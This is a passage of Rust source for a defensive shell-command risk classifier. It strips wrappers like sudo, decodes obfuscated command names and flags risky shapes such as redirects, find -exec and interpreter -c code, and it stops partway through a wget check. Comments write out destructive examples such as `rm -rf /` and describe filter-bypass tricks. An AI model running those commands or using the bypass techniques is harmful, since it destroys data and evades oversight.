//! Command sanitization: AST-based canonical command head extraction.
//!
//! This module replaces the old glob/substring matching in `risk_config.rs`
//! with a tree-sitter-bash AST parser. Instead of checking whether a command
//! string *contains* a pattern, we parse the command into a syntax tree and
//! extract the **canonical command head** — the actual program being run after
//! stripping wrappers (sudo, env, timeout, nohup) and normalizing aliases
//! (gcp -> cp, gawk -> awk).
//!
//! ## Why AST instead of glob?
//!
//! Glob matching (`command.contains("docker system prune")`) is trivially
//! bypassed:
//! - Flag reordering: `docker system prune -af` != pattern `docker system prune -a`
//! - Wrapper stacking: `sudo docker system prune` doesn't start with `docker`
//! - Alias variation: `gcp file dest` is `cp` on macOS (brew coreutils)
//! - Encoding tricks: `$'\x72\x6d'` decodes to `rm` but contains neither
//!
//! ## fail-closed principle
//!
//! If the parser fails (syntax error, unknown node type, empty tree), the
//! function returns `None`. Callers **must** treat `None` as high-risk
//! (typically `RiskLevel::High` or `RiskLevel::Blocked`), never as "safe".
//! This is the fail-closed principle: better to over-classify a safe command
//! as risky than to let a dangerous one through.

use std::collections::HashSet;

use tree_sitter::{Node, Parser};

/// Initialize the bash parser. The grammar is compiled into the binary at
/// build time, so no external files are needed.
fn bash_parser() -> Result<Parser, tree_sitter::LanguageError> {
    let mut parser = Parser::new();
    let language = tree_sitter_bash::LANGUAGE.into();
    parser.set_language(&language)?;
    Ok(parser)
}

/// Wrappers that prepend another command. We strip these to find the real
/// command head. Each entry is the bare command name (lowercase).
///
/// These wrappers have the form: `wrapper [wrapper-options...] real-command ...`
/// so we skip the wrapper name and its flag arguments (starting with `-`) to
/// find the real command.
const WRAPPERS: &[&str] = &[
    "sudo",
    "env",
    "timeout",
    "nohup",
    "doas",
    "su",
    "pkexec",
    "nice",
    "ionice",
    "stdbuf",
    "time",
    "command",
    "builtin",
    "\\source",
    ".",
    // Finding 13: additional wrappers that prepend another command.
    "xargs",
    "setsid",
    "flock",
    "exec",
    "strace",
    "ltrace",
    "chrt",
    "taskset",
    "chroot",
    "unshare",
    "fakeroot",
    "eatmydata",
];

/// Finding 22: Wrappers that have a positional argument before the real command.
/// For example, `flock /path/to/lock command`, `chroot /newroot command`,
/// `timeout 30s command`, `xargs command` (xargs's positional IS the command).
/// These wrappers skip their positional argument before looking for the command.
const POSITIONAL_WRAPPERS: &[&str] = &["flock", "chroot", "unshare"];

/// Finding 22: For certain wrappers, some flags take a value argument.
/// We need to skip both the flag and its value, otherwise the value
/// is mistaken for the real command (e.g. `nice -n 5 cmd` → `5` is NOT the command).
fn wrapper_value_flags(wrapper: &str) -> &'static [&'static str] {
    match wrapper {
        "nice" => &["-n", "--adjustment"],
        "ionice" => &["-c", "-n", "-p", "--class", "--classdata", "--pid"],
        "stdbuf" => &["-i", "-o", "-e", "--input", "--output", "--error"],
        "chrt" => &["-p", "-m", "--pid", "--max"],
        "taskset" => &["-c", "-p", "--cpu-list", "--pid"],
        "flock" => &[
            "-w",
            "-W",
            "-E",
            "-c",
            "--wait",
            "--conflict-exit-code",
            "--command",
        ],
        "strace" | "ltrace" => &[
            "-o",
            "-e",
            "-p",
            "-s",
            "-S",
            "--output",
            "--expr",
            "--pid",
            "--string-limit",
            "--summary",
        ],
        "xargs" => &[
            "-I",
            "-P",
            "-L",
            "-n",
            "-s",
            "-t",
            "-r",
            "--replace",
            "--max-procs",
            "--max-lines",
            "--max-args",
            "--max-chars",
            "--arg-file",
            "-a",
        ],
        "setsid" => &["-w", "--wait"],
        "unshare" => &["-r", "-R", "--root", "--mount-proc"],
        _ => &[],
    }
}

/// macOS brew coreutils aliases: `g<cmd>` maps to `<cmd>`.
const BREW_PREFIXES: &[(&str, &str)] = &[
    ("gcp", "cp"),
    ("gmv", "mv"),
    ("grm", "rm"),
    ("gls", "ls"),
    ("gcat", "cat"),
    ("ghead", "head"),
    ("gtail", "tail"),
    ("gchmod", "chmod"),
    ("gchown", "chown"),
    ("gmkdir", "mkdir"),
    ("grmdir", "rmdir"),
    ("gdd", "dd"),
    ("gtruncate", "truncate"),
    ("gstat", "stat"),
    ("gwc", "wc"),
    ("gsort", "sort"),
    ("guniq", "uniq"),
    ("gcut", "cut"),
    ("gpaste", "paste"),
    ("gtr", "tr"),
    ("gtee", "tee"),
    ("gfind", "find"),
    ("gxargs", "xargs"),
    ("grealpath", "realpath"),
    ("greadlink", "readlink"),
    ("gbasename", "basename"),
    ("gdirname", "dirname"),
    ("gmktemp", "mktemp"),
    ("gdu", "du"),
    ("gdf", "df"),
    ("gln", "ln"),
    ("gtouch", "touch"),
    ("guptime", "uptime"),
    ("gwhoami", "whoami"),
    ("gid", "id"),
    ("ggroups", "groups"),
    ("gdate", "date"),
    ("ghostname", "hostname"),
    ("garch", "arch"),
    ("gnproc", "nproc"),
    ("gexpr", "expr"),
    ("gfactor", "factor"),
    ("gseq", "seq"),
    ("gshuf", "shuf"),
];

/// awk variants that should be normalized to `awk`.
const AWK_VARIANTS: &[&str] = &["gawk", "mawk", "nawk"];

/// Structured shape risk, consumed by `classify_risk` to surface commands that
/// would block or flood a non-interactive exec channel above `Low`.
///
/// This mirrors RSSH's "shape validator" layer: it flags command *shapes*
/// (interactive full-screen programs, sampling loops without an explicit
/// count) independently of the destructive-command blacklist.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShapeRisk {
    /// Interactive full-screen / flooding command (bare `top`, `htop`, `watch`,
    /// `vim`, `less`, `tmux`, `screen`, `tail -f`). These block a
    /// non-interactive exec channel or flood a session with terminal redraws.
    Interactive,
    /// Sampling loop without an explicit iteration count (`vmstat 1` instead
    /// of `vmstat 1 5`).
    UnboundedLoop,
}

/// The result of analyzing a command: the canonical head (or `None` if parsing
/// failed — **fail-closed**), and whether the command had any parse errors.
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    /// The canonical command name (lowercase, wrapper-stripped, alias-normalized).
    /// `None` means the parser could not extract a reliable head — the caller
    /// must treat this as high-risk (fail-closed).
    pub canonical_head: Option<String>,
    /// True if the tree-sitter parse produced any ERROR or MISSING nodes.
    /// Even if we extracted a head, errors suggest the command may have
    /// obfuscation attempts.
    pub had_parse_errors: bool,
    /// S2: Security warnings detected by `check_redirects` — e.g. file
    /// redirects to paths other than `/dev/null` that bypass the patch_file
    /// workflow. Empty if no issues found.
    pub redirect_warnings: Vec<String>,
    /// S3: Security warnings detected by per-command shape rules — e.g.
    /// `find -delete`, `curl -O`, `sed -i`, `tail -f` without a count, etc.
    pub shape_warnings: Vec<String>,
    /// Structured shape risk (interactive / unbounded loop), if any. Consumed
    /// by `classify_risk` to escalate these commands above `Low`.
    pub shape: Option<ShapeRisk>,
}

/// Parse a command string and extract its canonical command head.
///
/// Returns `CommandAnalysis { canonical_head, had_parse_errors }`.
///
/// ## Algorithm
///
/// 1. Parse the command with tree-sitter-bash.
/// 2. Walk the top-level node to find the first `command` node (skipping
///    pipeline segments, `&&`, `||`, etc.).
/// 3. From the `command` node, extract the command name (first child that is
///    a `word` or `raw_string` or `string` or `concatenation`).
/// 4. If the name is a known wrapper (sudo, env, timeout, ...), skip it and
///    its flag arguments (tokens starting with `-`), then try the next word.
/// 5. Normalize the name: lowercase, strip brew `g` prefix, map awk variants.
/// 6. If at any point we encounter an ERROR node or can't find a command name,
///    set `had_parse_errors = true`. If we can't find any command name at all,
///    return `canonical_head = None` (fail-closed).
pub fn analyze_command(command: &str) -> CommandAnalysis {
    let source = command.as_bytes();
    let mut parser = match bash_parser() {
        Ok(p) => p,
        Err(_) => {
            return CommandAnalysis {
                canonical_head: None,
                had_parse_errors: true,
                redirect_warnings: vec![],
                shape_warnings: vec![],
                shape: None,
            }
        }
    };

    let tree = match parser.parse(command, None) {
        Some(t) => t,
        None => {
            return CommandAnalysis {
                canonical_head: None,
                had_parse_errors: true,
                redirect_warnings: vec![],
                shape_warnings: vec![],
                shape: None,
            }
        }
    };
    let root = tree.root_node();

    let had_errors = has_errors(root);

    // Walk the top-level to find the first executable command.
    let head = find_first_command_head(&root, source);

    // S2: Check for dangerous file redirects in the AST subtree
    let redirect_warnings = check_all_redirects(&root, source);

    // S3: Check per-command shape rules (find -delete, curl -O, sed -i, etc.)
    let (shape_warnings, shape) = check_command_shapes(&root, source);

    CommandAnalysis {
        canonical_head: head,
        had_parse_errors: had_errors,
        redirect_warnings,
        shape_warnings,
        shape,
    }
}

/// Split a possibly-chained shell command (`a && b; c | d`) into its
/// constituent command segments using the tree-sitter AST, so quoted
/// separators (`echo "a && b"`) are not mis-split.
///
/// Risk classification uses this to close a bypass: single-head analysis
/// only evaluates the first command of a chain, letting later destructive
/// commands (e.g. `echo hi && rm -rf /`) escape detection. Evaluating every
/// segment and keeping the strictest result closes that gap.
///
/// If parsing fails, the whole command is returned as one segment; the
/// caller's existing parse-error handling stays fail-closed (High).
pub fn split_commands(command: &str) -> Vec<String> {
    let Ok(mut parser) = bash_parser() else {
        return vec![command.to_string()];
    };
    let Some(tree) = parser.parse(command, None) else {
        return vec![command.to_string()];
    };
    let root = tree.root_node();
    let mut ranges: Vec<(usize, usize)> = Vec::new();
    collect_command_ranges(&root, &mut ranges);
    if ranges.is_empty() {
        return vec![command.to_string()];
    }
    ranges
        .into_iter()
        .map(|(start, end)| command[start..end].to_string())
        .collect()
}

/// Depth-first collection of every `command` node's source byte range.
/// Collecting all (including nested/substituted) commands is deliberately
/// conservative: classifying a function body or `$(...)` substitution as
/// dangerous escalates risk, which is the safe direction.
fn collect_command_ranges(node: &Node, out: &mut Vec<(usize, usize)>) {
    if node.kind() == "command" {
        out.push((node.start_byte(), node.end_byte()));
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_command_ranges(&child, out);
    }
}

/// Recursively check if a node (or any descendant) has ERROR or MISSING nodes.
fn has_errors(node: Node) -> bool {
    if node.is_error() || node.is_missing() {
        return true;
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if has_errors(child) {
            return true;
        }
    }
    false
}

/// Walk the tree to find the first `command` node, then extract and normalize
/// its head. Returns `None` if no command node is found or the head can't be
/// extracted.
fn find_first_command_head(root: &Node, source: &[u8]) -> Option<String> {
    // The root is typically `program` or `ERROR`. We need to find the first
    // `command` node in the tree.
    let cmd_node = find_first_node_of_type(root, "command")?;
    extract_head_from_command(&cmd_node, source)
}

/// Depth-first search for the first node of a given type.
fn find_first_node_of_type<'a>(node: &Node<'a>, type_name: &str) -> Option<Node<'a>> {
    if node.kind() == type_name {
        return Some(*node);
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(found) = find_first_node_of_type(&child, type_name) {
            return Some(found);
        }
    }
    None
}

/// Extract the command head from a `command` AST node.
///
/// A `command` node in tree-sitter-bash has children like:
///   command_name (word) | argument (word) | flag (word starting with -) | ...
///
/// We extract the first word as the command name, then check if it's a wrapper.
/// If so, we skip the wrapper and its flags to find the real command.
fn extract_head_from_command(cmd_node: &Node, source: &[u8]) -> Option<String> {
    let wrapper_set: HashSet<&str> = WRAPPERS.iter().copied().collect();

    // Collect the word-like children of the command node.
    let mut words = collect_command_words(cmd_node, source);
    if words.is_empty() {
        return None;
    }

    // Try the first word as the command name.
    let mut idx = 0;
    let mut head = words[idx].clone();

    // Strip wrappers: sudo, env, timeout, etc.
    // These have the form: wrapper [-flags...] real-command ...
    // We skip the wrapper name and any subsequent tokens starting with '-'.
    while wrapper_set.contains(&head.to_lowercase().as_str()) {
        let wrapper_lower = head.to_lowercase();
        idx += 1;

        // Special handling per wrapper type.
        match wrapper_lower.as_str() {
            "timeout" => {
                // `timeout` takes a duration argument before the command:
                //   timeout 30s cmd, timeout 5m cmd, timeout --signal=KILL 10 cmd
                // Skip flags (starting with -) and the first non-flag token (duration).
                let mut skipped_duration = false;
                while idx < words.len() {
                    if words[idx].starts_with('-') {
                        // Skip flag and possibly its value for long options.
                        idx += 1;
                    } else if !skipped_duration {
                        // Skip the duration token.
                        skipped_duration = true;
                        idx += 1;
                    } else {
                        break;
                    }
                }
            }
            "sudo" => {
                // sudo flags that take a value argument: -u/--user, -g/--group,
                // -C/--close-from, -D/--chdir, -R/--role, -T/--type, -P/--preserve-env
                let value_flags = [
                    "-u",
                    "--user",
                    "-g",
                    "--group",
                    "-C",
                    "--close-from",
                    "-D",
                    "--chdir",
                    "-R",
                    "-T",
                    "-P",
                ];
                while idx < words.len() {
                    if words[idx].starts_with('-') {
                        // Check if this is a long option with '=' (e.g. --user=root).
                        if words[idx].contains('=') {
                            idx += 1;
                        } else if value_flags.contains(&words[idx].as_str()) {
                            // Skip the flag and its value argument.
                            idx += 2;
                        } else {
                            // Short flag without value, or unknown flag.
                            idx += 1;
                        }
                    } else {
                        break;
                    }
                }
            }
            "doas" => {
                // doas -u user cmd — similar to sudo.
                let value_flags = ["-u", "--user"];
                while idx < words.len() {
                    if words[idx].starts_with('-') {
                        if words[idx].contains('=') {
                            idx += 1;
                        } else if value_flags.contains(&words[idx].as_str()) {
                            idx += 2;
                        } else {
                            idx += 1;
                        }
                    } else {
                        break;
                    }
                }
            }
            "su" => {
                // su [-l|--login|-] [username] [-c 'command'] — the only
                // extractable command is the value of `-c`/`--command`; without
                // it su drops into an interactive shell. `-c` is a value flag:
                // skip the flag and split its value to the first word, so
                // `su -c 'rm -rf /'` yields head "rm" instead of mistaking a
                // username (`su - root -c 'id'`) for the command.
                let value_flags = ["-c", "--command"];
                while idx < words.len() {
                    if words[idx].starts_with('-') {
                        if let Some(value) = words[idx].strip_prefix("--command=") {
                            // --command='cmd' as a single token.
                            words[idx] = value
                                .split_whitespace()
                                .next()
                                .unwrap_or_default()
                                .to_string();
                            break;
                        } else if words[idx].starts_with("-c=") {
                            words[idx] = words[idx][3..]
                                .split_whitespace()
                                .next()
                                .unwrap_or_default()
                                .to_string();
                            break;
                        } else if words[idx].contains('=') {
                            idx += 1; // some other --flag=value
                        } else if value_flags.contains(&words[idx].as_str()) {
                            idx += 1;
                            if idx < words.len() {
                                words[idx] = words[idx]
                                    .split_whitespace()
                                    .next()
                                    .unwrap_or_default()
                                    .to_string();
                            }
                            break;
                        } else {
                            idx += 1; // -l, -, --login, -s /bin/sh, ...
                        }
                    } else {
                        idx += 1; // username / positional
                    }
                }
                if idx >= words.len() {
                    // No command after su (e.g. `su root` → interactive shell).
                    return Some(normalize_name(&head));
                }
            }
            "env" => {
                // env accepts `-u NAME` / `--unset=NAME` (skip the flag and its
                // value) plus `-i`/`--ignore-environment`. `VAR=value`
                // assignments are handled by is_wrapper_value below. Without
                // this branch, `env -u PATH rm -rf /` would stop at "PATH"
                // and hide the real command from risk classification.
                let value_flags = ["-u", "--unset"];
                while idx < words.len() {
                    if words[idx].starts_with('-') {
                        if words[idx].contains('=') {
                            // Long option with '=' (e.g. --unset=PATH).
                            idx += 1;
                        } else if value_flags.contains(&words[idx].as_str()) {
                            // Flag takes a value: skip flag + value.
                            idx += 2;
                        } else {
                            // Bare flag without value.
                            idx += 1;
                        }
                    } else {
                        break;
                    }
                }
            }
            _ => {
                // Finding 22: Generic wrapper — skip flags, but also skip
                // values of flags that take an argument (e.g. `nice -n 5 cmd`).
                let value_flags = wrapper_value_flags(&wrapper_lower);
                let positional = POSITIONAL_WRAPPERS.contains(&wrapper_lower.as_str());
                let mut skipped_positional = false;
                while idx < words.len() {
                    if words[idx].starts_with('-') {
                        // Long option with '=' (e.g. --adjustment=5): skip one token.
                        if words[idx].contains('=') {
                            idx += 1;
                        } else if value_flags.contains(&words[idx].as_str()) {
                            // Flag takes a value: skip flag + value.
                            idx += 2;
                        } else {
                            // Bare flag without value.
                            idx += 1;
                        }
                    } else if positional && !skipped_positional {
                        // Skip the positional argument (lock file, new root, etc.)
                        skipped_positional = true;
                        idx += 1;
                    } else {
                        break;
                    }
                }
            }
        }

        // Also handle env VAR=value assignments.
        if wrapper_lower == "env" {
            while idx < words.len() && is_wrapper_value("env", &words[idx], idx) {
                idx += 1;
            }
            // Skip flags too.
            while idx < words.len() && words[idx].starts_with('-') {
                idx += 1;
            }
        }

        if idx >= words.len() {
            // The entire command was just wrappers + flags, no real command.
            return Some(normalize_name(&head));
        }
        head = words[idx].clone();
    }

    Some(normalize_name(&head))
}

/// For certain wrappers, the next non-flag argument is a value, not a command.
/// For example, `env VAR=value cmd` — `VAR=value` is a value assignment, not
/// a command. We should skip it.
fn is_wrapper_value(wrapper: &str, token: &str, _idx: usize) -> bool {
    // `env` accepts VAR=value assignments before the command.
    if wrapper == "env" {
        return token.contains('=');
    }
    // `su` takes a username argument: `su root -c cmd`.
    // We don't handle `-c` here; the `-c` will be skipped as a flag.
    false
}

/// Collect all word-like tokens from a `command` node.
///
/// The tree-sitter-bash `command` node has this structure:
/// ```text
/// command
///   command_name        ← contains the actual program name
///     word / raw_string / ansi_c_string / string
///   word                ← arguments
///   word
///   ...
/// ```
/// We must first extract the `command_name` child to get the program name,
/// then collect the remaining argument words.
fn collect_command_words(cmd_node: &Node, source: &[u8]) -> Vec<String> {
    let mut words = Vec::new();
    let mut cursor = cmd_node.walk();

    for child in cmd_node.children(&mut cursor) {
        match child.kind() {
            // The command_name node wraps the actual program name token.
            "command_name" => {
                if let Some(text) = extract_token_text(&child, source) {
                    words.push(text);
                }
            }
            // Direct argument tokens.
            "word" => {
                if let Ok(text) = child.utf8_text(source) {
                    words.push(text.to_string());
                }
            }
            // Numeric arguments (e.g. `timeout 30 cmd` — `30` is a `number` node).
            "number" => {
                if let Ok(text) = child.utf8_text(source) {
                    words.push(text.to_string());
                }
            }
            "raw_string" => {
                if let Ok(text) = child.utf8_text(source) {
                    let decoded = decode_ansi_c_escapes(text);
                    words.push(decoded);
                }
            }
            "string" => {
                if let Ok(text) = child.utf8_text(source) {
                    let stripped = strip_quotes(text);
                    words.push(stripped);
                }
            }
            "concatenation" => {
                if let Some(text) = extract_concatenation_text(&child, source) {
                    words.push(text);
                }
            }
            _ => {}
        }
    }

    words
}

/// Extract text from a `command_name` node by looking at its single child
/// (which may be `word`, `raw_string`, `ansi_c_string`, or `string`).
fn extract_token_text(node: &Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        match child.kind() {
            "word" => {
                return child.utf8_text(source).ok().map(|s| s.to_string());
            }
            "raw_string" | "ansi_c_string" => {
                // ANSI-C quoting like $'\x72\x6d' — decode escapes.
                return child.utf8_text(source).ok().map(decode_ansi_c_escapes);
            }
            "string" => {
                return child.utf8_text(source).ok().map(strip_quotes);
            }
            "concatenation" => {
                return extract_concatenation_text(&child, source);
            }
            _ => {}
        }
    }
    None
}

/// Decode ANSI-C escape sequences like `$'\x72\x6d'` to their literal values.
/// This is a simple decoder for the most common escapes used in obfuscation.
fn decode_ansi_c_escapes(s: &str) -> String {
    // Strip the $'...' wrapper if present.
    let inner = if s.starts_with("$'") && s.ends_with('\'') {
        &s[2..s.len() - 1]
    } else if s.starts_with("'") && s.ends_with('\'') {
        &s[1..s.len() - 1]
    } else {
        return s.to_string();
    };

    let mut result = String::new();
    let mut chars = inner.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some(escape_char @ ('x' | 'u' | 'U')) => {
                    // Hex escape: \xNN, \uNNNN, \UNNNNNNNN
                    let hex_len = if escape_char == 'x' {
                        2
                    } else if escape_char == 'u' {
                        4
                    } else {
                        8
                    };
                    let mut hex = String::new();
                    for _ in 0..hex_len {
                        if let Some(h) = chars.next() {
                            hex.push(h);
                        }
                    }
                    if let Ok(code) = u32::from_str_radix(&hex, 16) {
                        if let Some(ch) = char::from_u32(code) {
                            result.push(ch);
                        }
                    }
                }
                Some('n') => result.push('\n'),
                Some('t') => result.push('\t'),
                Some('r') => result.push('\r'),
                Some('\\') => result.push('\\'),
                Some('\'') => result.push('\''),
                Some('"') => result.push('"'),
                Some(other) => {
                    result.push('\\');
                    result.push(other);
                }
                None => result.push('\\'),
            }
        } else {
            result.push(c);
        }
    }
    result
}

/// Strip surrounding quotes from a string.
fn strip_quotes(s: &str) -> String {
    if (s.starts_with('"') && s.ends_with('"') && s.len() >= 2)
        || (s.starts_with('\'') && s.ends_with('\'') && s.len() >= 2)
    {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Extract text from a concatenation node (e.g. "pre"$var"post").
fn extract_concatenation_text(node: &Node, source: &[u8]) -> Option<String> {
    let mut result = String::new();
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        match child.kind() {
            "word" | "raw_string" | "string" => {
                if let Ok(text) = child.utf8_text(source) {
                    result.push_str(&decode_ansi_c_escapes(text));
                }
            }
            _ => break, // Stop at the first non-word child.
        }
    }
    if result.is_empty() {
        None
    } else {
        Some(result)
    }
}

/// Normalize a command name: lowercase, strip brew `g` prefix, map awk variants.
fn normalize_name(name: &str) -> String {
    let lower = name.to_lowercase();

    // Map awk variants.
    if AWK_VARIANTS.contains(&lower.as_str()) {
        return "awk".to_string();
    }

    // Strip brew coreutils `g` prefix.
    for (brew, canonical) in BREW_PREFIXES {
        if lower == *brew {
            return canonical.to_string();
        }
    }

    // Strip leading path components: /usr/bin/rm -> rm.
    // This is important because `/usr/bin/rm -rf /` should match `rm`.
    let basename = lower.rsplit('/').next().unwrap_or(&lower).to_string();

    basename
}

// ── S2: Recursive file redirect detection ────────────────────────────────────

/// S2: Recursively scan the entire AST subtree for `file_redirect` nodes that
/// write to paths other than `/dev/null` or fd duplicates.
///
/// tree-sitter-bash nests the `file_redirect` of `cmd <<EOF > /path` INSIDE
/// the `heredoc_redirect` node — a direct-children scan would skip that write
/// (the heredoc bypass: `echo x <<EOF > /etc/...` reaches the filesystem
/// without detection). Recursing the whole subtree catches every nested
/// redirect regardless of depth.
///
/// Returns a list of warning strings for each dangerous redirect found.
fn check_all_redirects(root: &Node, source: &[u8]) -> Vec<String> {
    let mut warnings = Vec::new();
    check_redirects_recursive(root, source, &mut warnings);
    warnings
}

/// Recursive helper — walks all descendants of `node` looking for
/// `file_redirect` nodes with output (`>`) destinations.
fn check_redirects_recursive(node: &Node, source: &[u8], warnings: &mut Vec<String>) {
    if node.kind() == "file_redirect" {
        check_one_file_redirect(node, source, warnings);
    }

    // Recurse into all children — create a fresh cursor for each level
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        check_redirects_recursive(&child, source, warnings);
    }
}

/// Check a single `file_redirect` node: if it's an output redirect (`>`, `>>`,
/// `&>`, `<>`, `N>`) whose destination is not `/dev/null` and not an fd
/// duplicate, emit a warning.
fn check_one_file_redirect(r: &Node, source: &[u8], warnings: &mut Vec<String>) {
    let dest_opt = r.child_by_field_name("destination");

    // file_redirect text looks like "> /tmp/x" / "<file" / "2>&1" / "&> out".
    // No `>` -> pure input redirect (`<`, `0<`, `N<`), not a file write — skip.
    let r_text = match r.utf8_text(source) {
        Ok(t) => t,
        Err(_) => return,
    };
    if !r_text.contains('>') {
        return;
    }

    let dest = match dest_opt {
        Some(d) => d,
        None => return,
    };

    // destination kind == number -> fd duplicate (2>&1 / 1>&2), not a file write.
    if dest.kind() == "number" {
        return;
    }

    // Destination may be quoted — normalize (strip outer quotes) before comparing.
    let dest_raw = match dest.utf8_text(source) {
        Ok(t) => t,
        Err(_) => return,
    };
    let dest_norm = strip_quotes(dest_raw);

    if dest_norm == "/dev/null" {
        return;
    }

    warnings.push(format!(
        "redirect to '{dest_norm}' (file write bypasses patch_file; only /dev/null is allowed)"
    ));
}

// ── S3: Per-command shape rules ──────────────────────────────────────────────

/// Commands that require at least two consecutive numeric arguments
/// (interval + count) to prevent unbounded loops.
const COUNTED_LOOP_COMMANDS: &[&str] = &["vmstat", "iostat", "mpstat", "sar", "pidstat", "dstat"];

/// Interactive full-screen programs, pagers, and multiplexers that block a
/// non-interactive exec channel (they read from the TTY / repaint the whole
/// screen). RSSH's shape validator flags these before sending them to SSH.
const INTERACTIVE_FULLSCREEN_COMMANDS: &[&str] = &[
    "htop", "watch", "vim", "vi", "less", "more", "tmux", "screen", "nano", "emacs", "top",
];

/// Finding 12: Interpreters that support inline code execution via `-c` or `-e` flags.
/// When these flags are used, the actual code is hidden inside the flag argument,
/// bypassing command sanitization.
const INTERPRETER_COMMANDS: &[&str] = &[
    "python",
    "python3",
    "python2",
    "pypy",
    "pypy3",
    "bash",
    "sh",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "csh",
    "tcsh",
    "perl",
    "ruby",
    "node",
    "nodejs",
    "deno",
    "bun",
    "php",
    "lua",
    "luajit",
    "tclsh",
    "wish",
    "awk",
    "gawk",
    "mawk",
    "ocaml",
    "ghc",
    "ghci",
    "scala",
    "clojure",
    "rscript",
    "Rscript",
    "powershell",
    "pwsh",
];

/// S3: Check per-command shape rules — detect dangerous flags and patterns
/// that bypass normal sanitization.
///
/// Returns `(warnings, shape)`: the warning strings plus a structured
/// `ShapeRisk` classification (interactive / unbounded loop) if any.
fn check_command_shapes(root: &Node, source: &[u8]) -> (Vec<String>, Option<ShapeRisk>) {
    let mut warnings = Vec::new();
    let mut shape: Option<ShapeRisk> = None;

    // Find all `command` nodes in the tree
    let mut commands = Vec::new();
    collect_all_commands(root, source, &mut commands);

    for (_cmd_node, head, args) in &commands {
        let head_lower = head.to_lowercase();
        let normalized = normalize_name(&head_lower);

        match normalized.as_str() {
            "find" => check_find_shape(args, &mut warnings),
            "curl" => check_curl_shape(args, &mut warnings),
            "wget" => check_wget_shape(args, &mut warnings),
            "sed" => check_sed_shape(args, &mut warnings),
            "tail" | "gtail" => {
                if check_tail_follow_shape(args, &mut warnings) {
                    shape = shape.or(Some(ShapeRisk::Interactive));
                }
            }
            "touch" | "gtouch" => check_touch_shape(args, &mut warnings),
            cmd if COUNTED_LOOP_COMMANDS.contains(&cmd) => {
                if check_counted_loop_shape(&normalized, args, &mut warnings) {
                    shape = shape.or(Some(ShapeRisk::UnboundedLoop));
                }
            }
            cmd if INTERACTIVE_FULLSCREEN_COMMANDS.contains(&cmd) => {
                if check_interactive_shape(&normalized, args, &mut warnings) {
                    shape = shape.or(Some(ShapeRisk::Interactive));
                }
            }
            // Finding 12: Detect interpreter delayed execution (python -c, bash -c, perl -e, etc.)
            cmd if INTERPRETER_COMMANDS.contains(&cmd) => {
                check_interpreter_shape(&normalized, args, &mut warnings);
            }
            // Finding 14: eval is a deferred-execution builtin.
            "eval" => {
                warnings.push(
                    "eval (deferred execution: evaluates string as command, bypasses sanitize)"
                        .to_string(),
                );
            }
            _ => {}
        }
    }

    (warnings, shape)
}

/// Collect all `command` nodes with their head and arguments.
fn collect_all_commands<'a>(
    root: &Node<'a>,
    source: &[u8],
    out: &mut Vec<(Node<'a>, String, Vec<String>)>,
) {
    collect_commands_recursive(root, source, out);
}

fn collect_commands_recursive<'a>(
    node: &Node<'a>,
    source: &[u8],
    out: &mut Vec<(Node<'a>, String, Vec<String>)>,
) {
    if node.kind() == "command" {
        let words = collect_command_words(node, source);
        if !words.is_empty() {
            // Use extract_head_from_command which strips wrappers (sudo, env, etc.)
            // and normalizes the head, so shape rules work through wrappers.
            let head = extract_head_from_command(node, source)
                .unwrap_or_else(|| normalize_name(&words[0]));
            // Arguments: all words after the command name, skipping wrapper flags.
            // For shape rules, we need the args of the real command, not the wrapper.
            // extract_head_from_command already found the real head index internally,
            // but doesn't expose it. As a simple heuristic, collect all non-wrapper
            // args starting from the head position.
            let wrapper_set: HashSet<&str> = WRAPPERS.iter().copied().collect();
            let mut args = Vec::new();
            let mut idx = 0;
            let mut current_head = words[idx].to_lowercase();
            // Skip wrappers the same way extract_head_from_command does (simplified)
            while wrapper_set.contains(&current_head.as_str()) && idx + 1 < words.len() {
                idx += 1;
                // Skip wrapper flags
                while idx < words.len() && words[idx].starts_with('-') {
                    idx += 1;
                }
                if idx < words.len() {
                    // For timeout, skip the duration
                    if current_head == "timeout" && idx < words.len() {
                        idx += 1; // skip duration
                    }
                    current_head = words[idx].to_lowercase();
                }
            }
            // Collect remaining words as args
            args.extend(words.iter().skip(idx + 1).cloned());
            out.push((*node, head, args));
        }
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_commands_recursive(&child, source, out);
    }
}

/// `find -exec` / `-execdir` execute arbitrary commands per match, bypassing
/// sanitization. `-delete` directly removes files.
fn check_find_shape(args: &[String], warnings: &mut Vec<String>) {
    for t in args {
        match t.as_str() {
            "-exec" | "-execdir" => {
                warnings.push(format!(
                    "find {t} (executes arbitrary command per match, bypasses sanitize)"
                ));
            }
            "-delete" => {
                warnings
                    .push("find -delete (directly removes files without patch_file)".to_string());
            }
            _ => {}
        }
    }
}

/// `curl -O` / `--remote-name` writes URL basename to disk, bypassing redirect
/// checks. `-o` / `--output` with a non-`/dev/null` path is also flagged.
fn check_curl_shape(args: &[String], warnings: &mut Vec<String>) {
    let mut prev_is_output = false;
    for t in args {
        if *t == "-O" || *t == "--remote-name" || *t == "--remote-name-all" {
            warnings.push(format!(
                "curl {t} (writes URL basename to disk; use stdout redirect instead)"
            ));
            continue;
        }
        if prev_is_output {
            if *t != "/dev/null" && *t != "-" {
                warnings.push(format!(
                    "curl -o '{t}' (file write; only /dev/null or stdout allowed)"
                ));
            }
            prev_is_output = false;
            continue;
        }
        if *t == "-o" || *t == "--output" {
            prev_is_output = true;
            continue;
        }
        if let Some(path) = t.strip_prefix("--output=") {
            if path != "/dev/null" && path != "-" {
                warnings.push(format!(
                    "curl --output={path} (file write; only /dev/null or stdout allowed)"
                ));
            }
        }
    }
}

/// `wget -O` / `--output-document` with a non-`/dev/null` path is flagged.
fn check_wget_shape(args: &[String], warnings: &mut Vec<String>) {
    let mut prev_is_output = false;
    for t in args {
        if prev_is_output {
            if *t != "/dev/null" && *t != "-" {
                warnings.push(format!(
                    "wget -O '{t}' (file write; only /dev/null or stdout allowed)"
                ));
